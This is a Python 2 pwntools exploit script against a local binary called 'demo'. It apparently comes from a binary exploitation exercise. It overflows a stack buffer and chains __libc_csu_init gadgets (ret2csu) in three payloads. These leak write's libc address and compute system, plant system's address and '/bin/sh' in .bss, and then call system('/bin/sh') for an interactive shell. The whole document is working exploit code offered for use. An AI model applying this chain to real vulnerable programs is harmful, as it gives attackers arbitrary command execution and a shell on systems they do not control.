from pwn import *

offset = 136

p = process('./demo')
ss = raw_input()
elf = ELF('demo')
libc = ELF('libc-2.23.so')

got_write = elf.got['write']
got_read  = elf.got['read']
addr_bss  = elf.bss()
addr_main = elf.symbols['main']
offset_addr_system = libc.symbols['write'] - libc.symbols['system']

addr_gadget_1 = 0x40061a
#   40061a:	5b                   	pop    %rbx
#   40061b:	5d                   	pop    %rbp
#   40061c:	41 5c                	pop    %r12
#   40061e:	41 5d                	pop    %r13
#   400620:	41 5e                	pop    %r14
#   400622:	41 5f                	pop    %r15
#   400624:	c3                   	retq 
addr_gadget_2 = 0x400600
#   400600:	4c 89 ea             	mov    %r13,%rdx
#   400603:	4c 89 f6             	mov    %r14,%rsi
#   400606:	44 89 ff             	mov    %r15d,%edi
#   400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
#   40060d:	48 83 c3 01          	add    $0x1,%rbx
#   400611:	48 39 eb             	cmp    %rbp,%rbx
#   400614:	75 ea                	jne    400600 <__libc_csu_init+0x40>
#   400616:	48 83 c4 08          	add    $0x8,%rsp

# r13->rdx  r14->rsi  r15d->edi
# write(rdi, rsi, rdx)
# read(rdi, rsi, rdx)

print "got_write= " + hex(got_write)
print "got_read= " + hex(got_read)
print "addr_bss= " + hex(addr_bss)
print "addr_main= " + hex(addr_main)
print "offset_system= " + hex(offset_addr_system)

payload1 = '\x00' * offset
payload1 += p64(addr_gadget_1) + p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1)
payload1 += p64(addr_gadget_2)
payload1 += '\x00' * 56
payload1 += p64(addr_main)
# payload1 += '\x00' * (512 - len(payload1))

p.recvuntil('Hello, World\n')
print '##########################send payload1#############################'
p.send(payload1)
sleep(1)
write_addr = u64(p.recv(8))
addr_system = write_addr - offset_addr_system
print 'system_addr= ' + hex(addr_system)
sleep(1)



payload2 = '\x00' * offset
payload2 += p64(addr_gadget_1) + p64(0) + p64(1) + p64(got_read) + p64(16) + p64(addr_bss) + p64(0)
payload2 += p64(addr_gadget_2)
payload2 += '\x00' * 56
payload2 += p64(addr_main)
payload2 += '\x00' * (512 - len(payload2))
print '##########################send payload2#############################'
p.send(payload2)
sleep(1)
p.send(p64(addr_system) + '/bin/sh\0')
sleep(1)

payload3 = '\x00' * offset
payload3 += p64(addr_gadget_1) + p64(0) + p64(1) + p64(addr_bss) + p64(0) + p64(0) + p64(addr_bss + 8)
payload3 += p64(addr_gadget_2)
payload3 += '\x00' * 56
payload3 += p64(addr_main)
payload3 += '\x00' * (512 - len(payload3))
print '##########################send payload3#############################'
p.send(payload3)
sleep(1)

p.interactive()

